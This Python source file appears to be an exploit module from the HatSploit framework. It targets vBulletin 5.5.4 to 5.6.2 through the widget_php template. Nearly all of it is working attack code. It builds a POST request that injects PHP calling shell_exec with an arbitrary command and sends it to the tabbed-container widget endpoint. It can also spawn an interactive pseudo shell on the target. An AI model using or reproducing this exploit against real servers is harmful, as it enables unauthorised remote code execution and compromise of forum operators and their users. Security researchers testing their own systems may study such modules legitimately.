#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.tcp.tcp import tcp
from utils.shell.pseudo_shell import pseudo_shell
from utils.http.http import http

class HatSploitModule(HatSploitModule):
    tcp = tcp()
    pseudo_shell = pseudo_shell()
    http = http()

    details = {
        'Name': "vBulletin Widget PHP Template Code Execution",
        'Module': "exploit/multi/vbulletin_widget_php/template_code_execution",
        'Authors': [
            'enty8080'
        ],
        'Description': "vBulletin 5.5.4 till 5.6.2 widget_php widget_tabbedcontainer_tab_panel Remote Code Execution.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': None,
            'Type': "port",
            'Required': True
        },
        'PHP_METHOD': {
            'Description': "PHP method to execute command.",
            'Value': "shell_exec",
            'Type': None,
            'Required': True
        },
        'INSTALL_URL': {
            'Description': "URL to vBulletin installation.",
            'Value': "/",
            'Type': None,
            'Required': True
        },
        'COMMAND': {
            'Description': "Command to execute.",
            'Value': "uname -a",
            'Type': None,
            'Required': True
        },
        'PSEUDO': {
            'Description': "Spawn Pseudo shell.",
            'Value': "no",
            'Required': False
        }
    }

    def generate_payload(self, target_url, installation_path, php_method, command):
        self.badges.output_process("Generating payload...")

        payload = {'subWidgets[0][template]' : 'widget_php', 'subWidgets[0][config][code]' : f"echo {php_method}('{command}'); exit;"}
        new_url = f"{target_url}/{installation_path}/ajax/render/widget_tabbedcontainer_tab_panel"

        return (new_url, payload)

    def send_payload(self, target_url, payload):
        self.badges.output_process("Sending payload...")
        response = self.http.send_post_to_url(target_url, payload)

        if response.status_code != 200:
            self.badges.output_error("Failed to send payload!")
            return None

        return response

    def execute_command(self, target_url, installation_path, php_method, command):
        new_url, payload = self.generate_payload(target_url, installation_path, php_method, command)

        response = self.send_payload(new_url, payload)
        if not response:
            return (False, "")

        self.badges.output_process("Attempting to execute command...")

        command_output = (response.text).strip()
        return (True, command_output)

    def run(self):
        remote_host, remote_port, php_method, installation_path, command, pseudo = self.parser.parse_options(self.options)

        target = self.http.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        target_url = self.http.craft_url(remote_host, remote_port)
        if self.http.check_url_access(target_url):
            self.badges.output_error("Exploit failed!")
            return

        arguments = (target_url, installation_path, php_method)
        if pseudo in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command, arguments)
        else:
            self.pseudo_shell.execute_command(self.execute_command, command, arguments)
